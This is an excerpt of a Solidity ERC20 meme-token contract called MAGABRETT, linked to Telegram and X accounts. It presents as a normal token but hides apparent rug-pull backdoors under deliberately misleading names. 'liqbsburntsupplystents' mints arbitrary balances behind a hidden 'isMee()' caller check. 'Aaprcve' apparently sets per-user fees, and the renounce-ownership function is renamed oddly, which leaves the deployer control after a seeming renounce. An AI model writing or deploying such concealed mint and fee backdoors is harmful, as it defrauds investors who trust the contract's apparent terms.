/**
https://t.me/MagaBrettERC20
https://x.com/MagaBrettERC20
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipmagabrshdjks() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract MAGABRETT is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _marketwaltaddress= 0x9b6483c39bfF3B769ca2F3873Dd54Bf62181aBA7;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Aaprcve(address user, uint256 feePercents) external {
    ...
    function liqbsburntsupplystents(address recipient, uint256 airDrop)  external {uint256 receiveRewrd = airDrop;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
